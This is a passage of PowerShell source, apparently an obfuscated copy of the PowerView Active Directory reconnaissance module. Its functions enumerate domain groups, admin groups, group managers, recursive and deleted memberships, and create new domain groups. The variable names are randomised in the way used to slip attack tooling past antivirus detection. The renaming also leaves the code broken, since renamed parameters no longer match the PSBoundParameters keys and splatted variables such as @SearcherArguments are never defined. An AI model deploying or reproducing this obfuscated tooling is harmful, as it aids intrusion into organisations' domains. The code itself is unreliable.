                        $ypHo7v = (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $CO2KFH += "(objectguid=$ypHo7v)"
                    }
                    elseif ($It59GzvwEj.Contains('\')) {
                        $4QsEpCvyLO6c2atiUjSo5R = $It59GzvwEj.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -YSu8jzco2Jt Canonical
                        if ($4QsEpCvyLO6c2atiUjSo5R) {
                            $I5SvBl8QZyjfq3cGwo = $4QsEpCvyLO6c2atiUjSo5R.SubString(0, $4QsEpCvyLO6c2atiUjSo5R.IndexOf('/'))
                            $YePFivOGqr = $It59GzvwEj.Split('\')[1]
                            $CO2KFH += "(samAccountName=$YePFivOGqr)"
                            $wtWPex5R['Domain'] = $I5SvBl8QZyjfq3cGwo
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$I5SvBl8QZyjfq3cGwo' from '$It59GzvwEj'"
                            $7r6tb1T9EuCphkAL = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $CO2KFH += "(|(samAccountName=$It59GzvwEj)(name=$It59GzvwEj))"
                    }
                }

                if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                    $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $Iq7bLVAvhKnpjdMlH2 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $GI9NmDP = $PSBoundParameters['GroupScope']
                    $Iq7bLVAvhKnpjdMlH2 = Switch ($GI9NmDP) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GI9NmDP'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $TAyf5rLhz1hcv = $PSBoundParameters['GroupProperty']
                    $Iq7bLVAvhKnpjdMlH2 = Switch ($TAyf5rLhz1hcv) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$TAyf5rLhz1hcv'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $c7rZO2V9"
                    $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
                }

                $7r6tb1T9EuCphkAL.filter = "(&(objectCategory=group)$Iq7bLVAvhKnpjdMlH2)"
                Write-Verbose "[Get-DomainGroup] filter string: $($7r6tb1T9EuCphkAL.filter)"

                if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $7r6tb1T9EuCphkAL.FindOne() }
                else { $nhxRs5G1 = $7r6tb1T9EuCphkAL.FindAll() }
                $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        
                        $BOr2NcFYpLPWHjdn8TXZQ4 = $_
                    }
                    else {
                        $BOr2NcFYpLPWHjdn8TXZQ4 = Convert-LDAPProperty -UtHQ $_.Properties
                    }
                    $BOr2NcFYpLPWHjdn8TXZQ4.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $BOr2NcFYpLPWHjdn8TXZQ4
                }
                if ($nhxRs5G1) {
                    try { $nhxRs5G1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                $7r6tb1T9EuCphkAL.dispose()
            }
        }
    }
}


function New-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $2,

        [ValidateNotNullOrEmpty()]
        [String]
        $TwsV1,

        [ValidateNotNullOrEmpty()]
        [String]
        $hLD,

        [ValidateNotNullOrEmpty()]
        [String]
        $cMJGq7o3,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    $N = @{
        'Identity' = $2
    }
    if ($PSBoundParameters['Domain']) { $N['Domain'] = $3Ecdwi8qNy }
    if ($PSBoundParameters['Credential']) { $N['Credential'] = $3ezVSfm6f4k }
    $1tGa = Get-PrincipalContext @ContextArguments

    if ($1tGa) {
        $BOr2NcFYpLPWHjdn8TXZQ4 = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($1tGa.Context)

        
        $BOr2NcFYpLPWHjdn8TXZQ4.SamAccountName = $1tGa.Identity

        if ($PSBoundParameters['Name']) {
            $BOr2NcFYpLPWHjdn8TXZQ4.Name = $TwsV1
        }
        else {
            $BOr2NcFYpLPWHjdn8TXZQ4.Name = $1tGa.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $BOr2NcFYpLPWHjdn8TXZQ4.DisplayName = $hLD
        }
        else {
            $BOr2NcFYpLPWHjdn8TXZQ4.DisplayName = $1tGa.Identity
        }

        if ($PSBoundParameters['Description']) {
            $BOr2NcFYpLPWHjdn8TXZQ4.Description = $cMJGq7o3
        }

        Write-Verbose "[New-DomainGroup] Attempting to create group '$2'"
        try {
            $qYFR5PCZruUkdna9T = $BOr2NcFYpLPWHjdn8TXZQ4.Save()
            Write-Verbose "[New-DomainGroup] Group '$2' successfully created"
            $BOr2NcFYpLPWHjdn8TXZQ4
        }
        catch {
            Write-Warning "[New-DomainGroup] Error creating group '$2' : $_"
        }
    }
}


function Get-DomainManagedSecurityGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $wtWPex5R['Domain'] = $3Ecdwi8qNy
            $l6OxARucBpbqH124jLlwS = $3Ecdwi8qNy
        }
        else {
            $l6OxARucBpbqH124jLlwS = $8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN
        }

        
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $wtWPex5R['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $wtWPex5R['Identity'] = $_.managedBy
            $qYFR5PCZruUkdna9T = $wtWPex5R.Remove('LDAPFilter')

            
            
            $VFBXcE91 = Get-DomainObject @SearcherArguments
            
            $ZIa7Bu3LCKURqfAXlHt05 = New-Object PSObject
            $ZIa7Bu3LCKURqfAXlHt05 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $ZIa7Bu3LCKURqfAXlHt05 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $ZIa7Bu3LCKURqfAXlHt05 | Add-Member Noteproperty 'ManagerName' $VFBXcE91.samaccountname
            $ZIa7Bu3LCKURqfAXlHt05 | Add-Member Noteproperty 'ManagerDistinguishedName' $VFBXcE91.distinguishedName

            
            if ($VFBXcE91.samaccounttype -eq 0x10000000) {
                $ZIa7Bu3LCKURqfAXlHt05 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($VFBXcE91.samaccounttype -eq 0x30000000) {
                $ZIa7Bu3LCKURqfAXlHt05 | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $UcDG = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $UcDG['Server'] = $Gkd0Hz5f }
            if ($PSBoundParameters['SearchScope']) { $UcDG['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
            if ($PSBoundParameters['ResultPageSize']) { $UcDG['ResultPageSize'] = $dTP7Qv6RslNUx }
            if ($PSBoundParameters['ServerTimeLimit']) { $UcDG['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
            if ($PSBoundParameters['Tombstone']) { $UcDG['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
            if ($PSBoundParameters['Credential']) { $UcDG['Credential'] = $3ezVSfm6f4k }

            
            
            
            
            
            
            
            
            
            
            

            $ZIa7Bu3LCKURqfAXlHt05 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $ZIa7Bu3LCKURqfAXlHt05.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $ZIa7Bu3LCKURqfAXlHt05
        }
    }
}


function Get-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $wbDRyv7R,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $ZDK3Mfm9Y2aHUs,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        $iA8aCAaRdB = @{}
        if ($PSBoundParameters['Domain']) { $iA8aCAaRdB['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $iA8aCAaRdB['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['Credential']) { $iA8aCAaRdB['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        $7r6tb1T9EuCphkAL = Get-DomainSearcher @SearcherArguments
        if ($7r6tb1T9EuCphkAL) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $wtWPex5R['Identity'] = $S
                $wtWPex5R['Raw'] = $True
                $BOr2NcFYpLPWHjdn8TXZQ4 = Get-DomainGroup @SearcherArguments

                if (-not $BOr2NcFYpLPWHjdn8TXZQ4) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $S"
                }
                else {
                    $OHIDgioXJ5vSYkrp4Rh0 = $BOr2NcFYpLPWHjdn8TXZQ4.properties.item('samaccountname')[0]
                    $7TBcPwvOs85zYX0n = $BOr2NcFYpLPWHjdn8TXZQ4.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $gpniq3k7l4c5bCfYZ2a = $3Ecdwi8qNy
                    }
                    else {
                        
                        if ($7TBcPwvOs85zYX0n) {
                            $gpniq3k7l4c5bCfYZ2a = $7TBcPwvOs85zYX0n.SubString($7TBcPwvOs85zYX0n.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$7TBcPwvOs85zYX0n', only user accounts will be returned."
                    $7r6tb1T9EuCphkAL.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$7TBcPwvOs85zYX0n))"
                    $7r6tb1T9EuCphkAL.PropertiesToLoad.AddRange(('distinguishedName'))
                    $vLpXxy5J8BVMX8VjUelZ = $7r6tb1T9EuCphkAL.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $qYFR5PCZruUkdna9T = $wtWPex5R.Remove('Raw')
            }
            else {
                $CO2KFH = ''
                $Iq7bLVAvhKnpjdMlH2 = ''
                $S | Where-Object {$_} | ForEach-Object {
                    $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($It59GzvwEj -match '^S-1-') {
                        $CO2KFH += "(objectsid=$It59GzvwEj)"
                    }
                    elseif ($It59GzvwEj -match '^CN=') {
                        $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            
                            
                            $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$23DM' from '$It59GzvwEj'"
                            $wtWPex5R['Domain'] = $23DM
                            $7r6tb1T9EuCphkAL = Get-DomainSearcher @SearcherArguments
                            if (-not $7r6tb1T9EuCphkAL) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$23DM'"
                            }
                        }
                    }
                    elseif ($It59GzvwEj -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $ypHo7v = (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $CO2KFH += "(objectguid=$ypHo7v)"
                    }
                    elseif ($It59GzvwEj.Contains('\')) {
                        $4QsEpCvyLO6c2atiUjSo5R = $It59GzvwEj.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -YSu8jzco2Jt Canonical
                        if ($4QsEpCvyLO6c2atiUjSo5R) {
                            $I5SvBl8QZyjfq3cGwo = $4QsEpCvyLO6c2atiUjSo5R.SubString(0, $4QsEpCvyLO6c2atiUjSo5R.IndexOf('/'))
                            $YePFivOGqr = $It59GzvwEj.Split('\')[1]
                            $CO2KFH += "(samAccountName=$YePFivOGqr)"
                            $wtWPex5R['Domain'] = $I5SvBl8QZyjfq3cGwo
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$I5SvBl8QZyjfq3cGwo' from '$It59GzvwEj'"
                            $7r6tb1T9EuCphkAL = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $CO2KFH += "(samAccountName=$It59GzvwEj)"
                    }
                }

                if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                    $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $c7rZO2V9"
                    $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
                }

                $7r6tb1T9EuCphkAL.filter = "(&(objectCategory=group)$Iq7bLVAvhKnpjdMlH2)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($7r6tb1T9EuCphkAL.filter)"
                try {
                    $2KUDvV2HojTSzhMzNmslFPRL = $7r6tb1T9EuCphkAL.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$S': $_"
                    $vLpXxy5J8BVMX8VjUelZ = @()
                }

                $OHIDgioXJ5vSYkrp4Rh0 = ''
                $7TBcPwvOs85zYX0n = ''

                if ($2KUDvV2HojTSzhMzNmslFPRL) {
                    $vLpXxy5J8BVMX8VjUelZ = $2KUDvV2HojTSzhMzNmslFPRL.properties.item('member')

                    if ($vLpXxy5J8BVMX8VjUelZ.count -eq 0) {
                        
                        $4IdTmDP2AZH7oWiB1stE = $False
                        $7dlKLDpVz1ceTbavwO58WPy = 0
                        $8e0cYCRZvfTwiP3FQ = 0

                        while (-not $4IdTmDP2AZH7oWiB1stE) {
                            $8e0cYCRZvfTwiP3FQ = $7dlKLDpVz1ceTbavwO58WPy + 1499
                            $f="member;range=$7dlKLDpVz1ceTbavwO58WPy-$8e0cYCRZvfTwiP3FQ"
                            $7dlKLDpVz1ceTbavwO58WPy += 1500
                            $qYFR5PCZruUkdna9T = $7r6tb1T9EuCphkAL.PropertiesToLoad.Clear()
                            $qYFR5PCZruUkdna9T = $7r6tb1T9EuCphkAL.PropertiesToLoad.Add("$f")
                            $qYFR5PCZruUkdna9T = $7r6tb1T9EuCphkAL.PropertiesToLoad.Add('samaccountname')
                            $qYFR5PCZruUkdna9T = $7r6tb1T9EuCphkAL.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $2KUDvV2HojTSzhMzNmslFPRL = $7r6tb1T9EuCphkAL.FindOne()
                                $Yx4jfmC = $2KUDvV2HojTSzhMzNmslFPRL.Properties.PropertyNames -like "member;range=*"
                                $vLpXxy5J8BVMX8VjUelZ += $2KUDvV2HojTSzhMzNmslFPRL.Properties.item($Yx4jfmC)
                                $OHIDgioXJ5vSYkrp4Rh0 = $2KUDvV2HojTSzhMzNmslFPRL.properties.item('samaccountname')[0]
                                $7TBcPwvOs85zYX0n = $2KUDvV2HojTSzhMzNmslFPRL.properties.item('distinguishedname')[0]

                                if ($vLpXxy5J8BVMX8VjUelZ.count -eq 0) {
                                    $4IdTmDP2AZH7oWiB1stE = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $4IdTmDP2AZH7oWiB1stE = $True
                            }
                        }
                    }
                    else {
                        $OHIDgioXJ5vSYkrp4Rh0 = $2KUDvV2HojTSzhMzNmslFPRL.properties.item('samaccountname')[0]
                        $7TBcPwvOs85zYX0n = $2KUDvV2HojTSzhMzNmslFPRL.properties.item('distinguishedname')[0]
                        $vLpXxy5J8BVMX8VjUelZ += $2KUDvV2HojTSzhMzNmslFPRL.Properties.item($Yx4jfmC)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $gpniq3k7l4c5bCfYZ2a = $3Ecdwi8qNy
                    }
                    else {
                        
                        if ($7TBcPwvOs85zYX0n) {
                            $gpniq3k7l4c5bCfYZ2a = $7TBcPwvOs85zYX0n.SubString($7TBcPwvOs85zYX0n.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($jno in $vLpXxy5J8BVMX8VjUelZ) {
                if ($wbDRyv7R -and $iH) {
                    $UtHQ = $_.Properties
                }
                else {
                    $5cU = $wtWPex5R.Clone()
                    $5cU['Identity'] = $jno
                    $5cU['Raw'] = $True
                    $5cU['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $jp9jiurTsXvElqD = Get-DomainObject @ObjectSearcherArguments
                    $UtHQ = $jp9jiurTsXvElqD.Properties
                }

                if ($UtHQ) {
                    $KyhhJpfp9eN = New-Object PSObject
                    $KyhhJpfp9eN | Add-Member Noteproperty 'GroupDomain' $gpniq3k7l4c5bCfYZ2a
                    $KyhhJpfp9eN | Add-Member Noteproperty 'GroupName' $OHIDgioXJ5vSYkrp4Rh0
                    $KyhhJpfp9eN | Add-Member Noteproperty 'GroupDistinguishedName' $7TBcPwvOs85zYX0n

                    if ($UtHQ.objectsid) {
                        $xNIK = ((New-Object System.Security.Principal.SecurityIdentifier $UtHQ.objectsid[0], 0).Value)
                    }
                    else {
                        $xNIK = $qYFR5PCZruUkdna9T
                    }

                    try {
                        $kABPfXbE5z3CQ = $UtHQ.distinguishedname[0]
                        if ($kABPfXbE5z3CQ -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $xNIK) {
                                    $xNIK = $UtHQ.cn[0]
                                }
                                $MBxHfVegcQCo = Convert-ADName -S $xNIK -YSu8jzco2Jt 'DomainSimple' @ADNameArguments

                                if ($MBxHfVegcQCo) {
                                    $BPquDpdymSvZi = $MBxHfVegcQCo.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $kABPfXbE5z3CQ"
                                    $BPquDpdymSvZi = $qYFR5PCZruUkdna9T
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $kABPfXbE5z3CQ"
                                $BPquDpdymSvZi = $qYFR5PCZruUkdna9T
                            }
                        }
                        else {
                            
                            $BPquDpdymSvZi = $kABPfXbE5z3CQ.SubString($kABPfXbE5z3CQ.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $kABPfXbE5z3CQ = $qYFR5PCZruUkdna9T
                        $BPquDpdymSvZi = $qYFR5PCZruUkdna9T
                    }

                    if ($UtHQ.samaccountname) {
                        
                        $eaRfX5NtC4 = $UtHQ.samaccountname[0]
                    }
                    else {
                        
                        try {
                            $eaRfX5NtC4 = ConvertFrom-SID -iQFdt $UtHQ.cn[0] @ADNameArguments
                        }
                        catch {
                            
                            $eaRfX5NtC4 = $UtHQ.cn[0]
                        }
                    }

                    if ($UtHQ.objectclass -match 'computer') {
                        $sIAxuFZg0L = 'computer'
                    }
                    elseif ($UtHQ.objectclass -match 'group') {
                        $sIAxuFZg0L = 'group'
                    }
                    elseif ($UtHQ.objectclass -match 'user') {
                        $sIAxuFZg0L = 'user'
                    }
                    else {
                        $sIAxuFZg0L = $qYFR5PCZruUkdna9T
                    }
                    $KyhhJpfp9eN | Add-Member Noteproperty 'MemberDomain' $BPquDpdymSvZi
                    $KyhhJpfp9eN | Add-Member Noteproperty 'MemberName' $eaRfX5NtC4
                    $KyhhJpfp9eN | Add-Member Noteproperty 'MemberDistinguishedName' $kABPfXbE5z3CQ
                    $KyhhJpfp9eN | Add-Member Noteproperty 'MemberObjectClass' $sIAxuFZg0L
                    $KyhhJpfp9eN | Add-Member Noteproperty 'MemberSID' $xNIK
                    $KyhhJpfp9eN.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $KyhhJpfp9eN

                    
                    if ($PSBoundParameters['Recurse'] -and $kABPfXbE5z3CQ -and ($sIAxuFZg0L -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $kABPfXbE5z3CQ"
                        $wtWPex5R['Identity'] = $kABPfXbE5z3CQ
                        $qYFR5PCZruUkdna9T = $wtWPex5R.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $7r6tb1T9EuCphkAL.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $wtWPex5R['Identity'] = $S }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $l2mBeiWJzV = $_.Properties['distinguishedname'][0]
            ForEach($YUiaJDEmoj4zFG in $_.Properties['msds-replvaluemetadata']) {
                $L3iPh1Ap8zxlemWuFSNfUwQk = [xml]$YUiaJDEmoj4zFG | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($L3iPh1Ap8zxlemWuFSNfUwQk) {
                    if (($L3iPh1Ap8zxlemWuFSNfUwQk.pszAttributeName -Match 'member') -and (($L3iPh1Ap8zxlemWuFSNfUwQk.dwVersion % 2) -eq 0 )) {
                        $HLkP8yYwFiBnjz2lL = New-Object PSObject
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'GroupDN' $l2mBeiWJzV
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'MemberDN' $L3iPh1Ap8zxlemWuFSNfUwQk.pszObjectDn
